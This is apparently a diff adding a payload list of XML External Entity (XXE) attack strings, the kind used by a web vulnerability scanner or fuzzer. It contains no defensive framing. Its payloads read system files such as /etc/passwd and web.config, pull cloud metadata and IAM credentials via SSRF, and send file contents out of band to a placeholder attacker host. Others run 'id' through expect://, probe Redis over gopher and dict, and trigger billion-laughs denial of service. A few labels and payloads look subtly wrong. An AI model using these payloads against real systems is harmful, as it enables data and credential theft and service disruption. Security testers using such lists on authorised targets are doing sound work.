@@ -1,0 +1,64 @@
+# Generic XXE advanced payloads
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><f>&x;</f>
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><f>&x;</f>
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><f>&x;</f>
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY % x SYSTEM "file:///etc/passwd">%x;]>
+<?xml version="1.0"?><!DOCTYPE f [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><f>&xxe;</f>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>
+<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://127.0.0.1/evil.dtd">%dtd;]>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+# Blind OOB variants
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://INTERACTSH_URL/xxe">%xxe;]><foo/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://INTERACTSH_URL/evil.dtd">%remote;%intern;%exfil;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY &#37; x SYSTEM 'http://INTERACTSH_URL/?data=%f;'>">%e;%x;]>
+# Encoding bypass variants
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
+# Alternate protocols
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/foo">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_PING">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:6379/INFO">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "sftp://INTERACTSH_URL:22/">]><foo>&xxe;</foo>
+# PHP wrapper variants
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]><foo>&xxe;</foo>
+# DTD parameter entity chains
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %d SYSTEM "file:///etc/passwd"><!ENTITY xxe "%d;">]><foo>&xxe;</foo>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>
+# Windows targets
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><foo>&xxe;</foo>
+# SSRF via XXE
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">]><foo>&xxe;</foo>
+# Double encoded entity reference
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY &#x78;&#x78;&#x65; SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+# XInclude attack (when DOCTYPE is filtered)
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://INTERACTSH_URL/"/></foo>
+# Recursive entity expansion (billion laughs DoS)
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><lolz>&c;</lolz>
+# CVE-2019-0197 style
+<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+# Chunked encoding bypass
+<?xml%20version%3D%221.0%22%3F><!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22>]><foo>&xxe;</foo>
+# CDATA exfiltration
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://INTERACTSH_URL/evil.dtd">%dtd;]><foo>&all;</foo>
+# SVG embedded XXE
+<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
+# DOCX/Office XML
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE Properties [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Properties>&xxe;</Properties>
+# Error-based XXE (forces content into error msg)
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % f SYSTEM "file:///nonexistent/INTERACTSH_URL"><!ENTITY % e "<!ENTITY &#37; x SYSTEM 'file:///etc/%f;'>">%e;%x;]><foo/>
+# JSON-embedded XML with XXE (multipart)
+<?xml version="1.0"?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM "file:///etc/passwd">]><r>&sp;</r>
+# SAML XXE
+<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
